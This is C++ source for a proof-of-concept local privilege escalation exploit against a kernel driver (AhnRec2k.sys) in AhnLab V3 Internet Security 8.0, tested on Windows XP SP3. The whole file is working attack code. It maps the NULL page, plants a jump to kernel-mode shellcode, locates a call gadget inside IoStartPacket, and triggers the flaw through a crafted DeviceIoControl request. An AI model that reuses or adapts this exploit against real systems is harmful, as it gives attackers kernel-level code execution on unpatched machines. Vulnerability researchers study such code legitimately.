// ahnlab0day.cpp : Defines the entry point for the console application.
//
 
#include "stdafx.h"
#include "windows.h"
typedef LONG NTSTATUS, *PNTSTATUS;
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;
 
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;
 
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
typedef NTSTATUS (WINAPI *PNT_CREATE_FILE)(
  PHANDLE FileHandle,
  ACCESS_MASK DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PIO_STATUS_BLOCK IoStatusBlock,
  PLARGE_INTEGER AllocationSize,
  ULONG FileAttributes,
  ULONG ShareAccess,
  ULONG CreateDisposition,
  ULONG CreateOptions,
  PVOID EaBuffer,
  ULONG EaLength
    );
 
typedef NTSTATUS (WINAPI *PNT_CREATE_SYMBOLIC_LINK) (
 PHANDLE LinkHandle,
 ACCESS_MASK DesiredAccess,
 POBJECT_ATTRIBUTES ObjectAttributes,
 PUNICODE_STRING LinkTarget
);
 
#define RTL_CONSTANT_STRING(s) { sizeof( s ) - sizeof( (s)[0] ), sizeof( s ), s
}
#define RTL_CONST_CAST(type) (type)
UNICODE_STRING uniname = RTL_CONSTANT_STRING(L"\\Device\\AhnRecDrv");
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a) { sizeof(OBJECT_ATTRIBUTES), NULL,
RTL_CONST_CAST(PUNICODE_STRING)(n), a, NULL, NULL }
OBJECT_ATTRIBUTES oba = RTL_CONSTANT_OBJECT_ATTRIBUTES(&uniname ,
OBJ_CASE_INSENSITIVE);
#define FILE_OPEN 0x00000001
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#include "malloc.h"
PVOID GetInfoTable(ULONG ATableType)
{
ULONG mSize = 0x4000;
PVOID mPtr = NULL;
LONG status;
HMODULE hlib = GetModuleHandle("ntdll.dll");
PVOID pZwQuerySystemInformation = GetProcAddress(hlib ,
"ZwQuerySystemInformation");
do
{
mPtr = malloc(mSize);
if (mPtr)
{
__asm
{
push 0
push mSize
push mPtr
push ATableType
call pZwQuerySystemInformation
mov status , eax
}
}
else
{
return NULL;
}
if (status == 0xc0000004)
{
free(mPtr);
mSize = mSize * 2;
}
} while (status == 0xc0000004);
if (status == 0)
{
return mPtr;
}
free(mPtr);
return NULL;
}
enum { SystemModuleInformation = 11,
SystemHandleInformation = 16 };
typedef struct {
    ULONG   Unknown1;
    ULONG   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT Index;
    USHORT NameLength;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
 
 
typedef VOID (WINAPI *PINBV_ACQUIRE_DISPLAY_OWNERSHIP)(VOID);
typedef BOOLEAN (WINAPI *PINBV_RESET_DISPLAY)(VOID);
typedef VOID (WINAPI *PINBV_SOLID_COLOR_FILL)(
  ULONG x1,
  ULONG y1,
  ULONG x2,
  ULONG y2,
  ULONG color
    );
typedef ULONG (WINAPI *PINBV_SET_TEXT_COLOR)(
  ULONG Color
    );
typedef
VOID
(*INBV_DISPLAY_STRING_FILTER)(
  PUCHAR *Str
    );
 
typedef VOID (WINAPI *PINBV_INSTALL_DISPLAY_STRING_FILTER)(
    INBV_DISPLAY_STRING_FILTER DisplayStringFilter
    );
typedef BOOLEAN (WINAPI *PINBV_ENABLE_DISPLAY_STRING)(
    BOOLEAN bEnable
    );
typedef VOID (WINAPI *PINVB_SET_SCROLL_REGION)(
    ULONG x1,
    ULONG y1,
    ULONG x2,
    ULONG y2
    );
typedef VOID (WINAPI *PINBV_DISPLAY_STRING)(
    PUCHAR Str
    );
PINBV_ACQUIRE_DISPLAY_OWNERSHIP InbvAcquireDisplayOwnership = 0 ;
PINBV_RESET_DISPLAY InbvResetDisplay = 0 ;
PINBV_SOLID_COLOR_FILL InbvSolidColorFill = 0 ;
PINBV_SET_TEXT_COLOR InbvSetTextColor = 0 ;
PINBV_INSTALL_DISPLAY_STRING_FILTER InbvInstallDisplayStringFilter = 0 ;
PINBV_ENABLE_DISPLAY_STRING InbvEnableDisplayString = 0 ;
PINVB_SET_SCROLL_REGION InbvSetScrollRegion = 0 ;
PINBV_DISPLAY_STRING InbvDisplayString= 0 ;
 
#define VGA_COLOR_BLACK 0
#define VGA_COLOR_RED 1
#define VGA_COLOR_GREEN 2
#define VGA_COLOR_GR 3
#define VGA_COLOR_BULE 4
#define VGA_COLOR_DARK_MEGAENTA 5
#define VGA_COLOR_TURQUOISE 6
#define VGA_COLOR_GRAY 7
#define VGA_COLOR_BRIGHT_GRAY 8
#define VGA_COLOR_BRIGHT_RED 9
#define VGA_COLOR_BRIGHT_GREEN 10
#define VGA_COLOR_BRIGHT_YELLOW 11
#define VGA_COLOR_BRIGHT_BULE 12
#define VGA_COLOR_BRIGHT_PURPLE 13
#define VGA_COLOR_BRIGHT_TURQUOISE 14
#define VGA_COLOR_WHITE 15
UCHAR DisplayString[] =
"                                                                              
 "
"                                                                              
 "
"                                                                              
 "
"                ---- ===== EXPLOIT SUCCESSFULLY ==== ----                      
"
"                                                                              
 "
"                                                                              
 "
" AhnLab V3 Internet Security 8.0 Local Privilege Escalation Exploit            
"
"                                                                              
 "
" VULNERABLE PRODUCT                                                            
"
"                                                                              
 "
" AhnLab V3 Internet Security <= 8.0.3.28                                      
 "
"                                                                              
 "
"                                                                              
 "
" VULERABLE FILE                                                                
"
" AhnRec2k.sys <= 1.2.0.4                                                      
 "
"                                                                              
 "
" AUTHOR                                                                        
"
"                                                                              
 "
" MJ0011                                                                        
"
" th_decoder$126.com                                                            
"
"                                                                              
 "
" 2010-11-9                                                                    
 "
"                                                                              
 "
"                                                                              
 "
"                                                                              
 ";
 
VOID InbvShellCode()
{
//DISABLE INTERRUPT
 
__asm
{
cli
}
 
//RESET TO VGA MODE
 
InbvAcquireDisplayOwnership();
 
InbvResetDisplay();
 
//FILL FULL SCREEN
 
InbvSolidColorFill(0 , 0 , 639 , 479 ,VGA_COLOR_BLACK);
 
//SET TEXT COLOR
InbvSetTextColor(VGA_COLOR_BRIGHT_GREEN);
 
InbvInstallDisplayStringFilter(NULL);
 
InbvEnableDisplayString(TRUE);
 
InbvSetScrollRegion( 0 , 0 , 639 ,477);
 
InbvDisplayString(DisplayString);
while(TRUE)
{
 
};
 
 
}
 
BOOL InbvInit(PVOID ntosbase , PSTR ntosname)
{
HMODULE hlib = LoadLibrary(ntosname);
 
if (hlib == NULL)
{
return FALSE ;
}
 
InbvAcquireDisplayOwnership =
(PINBV_ACQUIRE_DISPLAY_OWNERSHIP)((ULONG)GetProcAddress(hlib ,
"InbvAcquireDisplayOwnership") - (ULONG)hlib + (ULONG)ntosbase);
InbvResetDisplay = (PINBV_RESET_DISPLAY)((ULONG)GetProcAddress(hlib ,
"InbvResetDisplay") - (ULONG)hlib + (ULONG)ntosbase);
InbvSolidColorFill = (PINBV_SOLID_COLOR_FILL)((ULONG)GetProcAddress(hlib ,
"InbvSolidColorFill") - (ULONG)hlib + (ULONG)ntosbase);
InbvSetTextColor = (PINBV_SET_TEXT_COLOR)((ULONG)GetProcAddress(hlib ,
"InbvSetTextColor") - (ULONG)hlib + (ULONG)ntosbase);
InbvInstallDisplayStringFilter =
(PINBV_INSTALL_DISPLAY_STRING_FILTER)((ULONG)GetProcAddress(hlib ,
"InbvInstallDisplayStringFilter") - (ULONG)hlib + (ULONG)ntosbase);
InbvEnableDisplayString =
(PINBV_ENABLE_DISPLAY_STRING)((ULONG)GetProcAddress(hlib ,
"InbvEnableDisplayString") - (ULONG)hlib + (ULONG)ntosbase);
InbvSetScrollRegion = (PINVB_SET_SCROLL_REGION)((ULONG)GetProcAddress(hlib ,
"InbvSetScrollRegion") - (ULONG)hlib + (ULONG)ntosbase);
InbvDisplayString = (PINBV_DISPLAY_STRING)((ULONG)GetProcAddress(hlib ,
"InbvDisplayString") - (ULONG)hlib + (ULONG)ntosbase);
 
if (InbvAcquireDisplayOwnership &&
InbvResetDisplay &&
InbvSolidColorFill &&
InbvSetTextColor &&
InbvInstallDisplayStringFilter &&
InbvEnableDisplayString &&
InbvSetScrollRegion &&
InbvDisplayString)
{
return TRUE ;
}
return FALSE ;
 
}
 
typedef LONG (WINAPI *PNT_ALLOCATE_VIRTUAL_MEMORY)(
   HANDLE ProcessHandle,
   PVOID *BaseAddress,
   ULONG_PTR ZeroBits,
   PSIZE_T RegionSize,
   ULONG AllocationType,
   ULONG Protect
   );
int main(int argc, char* argv[])
{
printf("AhnLab V3 Internet Security <= 8.0.3.28 AhnRec2k.sys <= 1.2.0.4\n"
"Local Kernel Mode Privilege Escalation Vulnerability POC\n\n"
"Test On Windows XP SP3\n"
"by MJ0011 th_decoder$126.com\n"
"Press Enter....\n"
);
getchar();
 
PSYSTEM_MODULE_INFORMATION pinfo =
(PSYSTEM_MODULE_INFORMATION)GetInfoTable(SystemModuleInformation);
if (pinfo==0)
{
printf("cannot get system info\n");
return 0 ;
}
if (!InbvInit(pinfo->Module[0].Base , strrchr(pinfo->Module[0].ImageName , '\\')
+ 1))
{
printf("cannot init inbv system!\n");
return 0 ;
}
 
 
HMODULE hlib = LoadLibrary(strrchr(pinfo->Module[0].ImageName , '\\') + 1);
 
if (hlib == 0 )
{
printf("cannot load ntoskrnl...\n");
getchar();
return 0 ;
}
 
PVOID pIoStartPacket = GetProcAddress(hlib , "IoStartPacket");
 
 
if (pIoStartPacket == NULL)
{
printf("IoStartPacket == NULL\n");
getchar();
return 0 ;
}
 
ULONG i ;
BOOL bFind = FALSE ;
 
for (i = 0 ; i < 0x100 ; i ++)
{
if (*(WORD*)(i + (ULONG)pIoStartPacket) == 0x50ff &&
*(BYTE*)((ULONG)pIoStartPacket + i + 2) == 0x30)
{
bFind = TRUE ;
break ;
}
}
 
if (bFind == FALSE)
{
printf("cannot find shellcode...\n");
getchar();
return 0 ;
}
 
ULONG pbuf = (ULONG)pIoStartPacket - (ULONG)hlib +
(ULONG)(pinfo->Module[0].Base) + i  ;
 
PNT_ALLOCATE_VIRTUAL_MEMORY NTAllocateVM =
(PNT_ALLOCATE_VIRTUAL_MEMORY)GetProcAddress(GetModuleHandle("ntdll.dll") ,
"NtAllocateVirtualMemory");
 
HANDLE hdev ;
IO_STATUS_BLOCK iosb ;
NTSTATUS stat ;
PVOID BaseAddress = (PVOID)0x1 ;
ULONG dwsize = 0x1000 ;
LONG status ;
status = NTAllocateVM
(
GetCurrentProcess() ,
&BaseAddress ,
0 ,
&dwsize ,
MEM_COMMIT | MEM_RESERVE ,
PAGE_READWRITE
);
 
 
printf("allocate vm at zero %08x\n" , status);
 
memset((PVOID)0x0 , 0x90 , 0x100);
 
*(BYTE*)0x50 = 0xe9 ;
*(DWORD*)0x51 = (ULONG)InbvShellCode - 0x50 - 5 ;
 
PNT_CREATE_FILE pfunc =
(PNT_CREATE_FILE)GetProcAddress(GetModuleHandle("ntdll.dll") , "ZwCreateFile");
 
 
stat = pfunc(&hdev ,
FILE_READ_ATTRIBUTES | SYNCHRONIZE ,
&oba ,
&iosb,
0 ,
0 ,
FILE_SHARE_READ ,
FILE_OPEN ,
FILE_SYNCHRONOUS_IO_NONALERT ,
0 ,
0 );
 
 
 
if (stat != 0 )
{
printf("cannot open dev %08x\n", stat);
return 0 ;
}
 
 
ULONG btr ;
 
if (!DeviceIoControl(hdev , 0x8101261C , &pbuf , sizeof(ULONG) , 0 ,0 , &btr , 0
))
{
printf("cannot dev ctl %u\n",GetLastError());
return 0 ;
}
return 0;
}
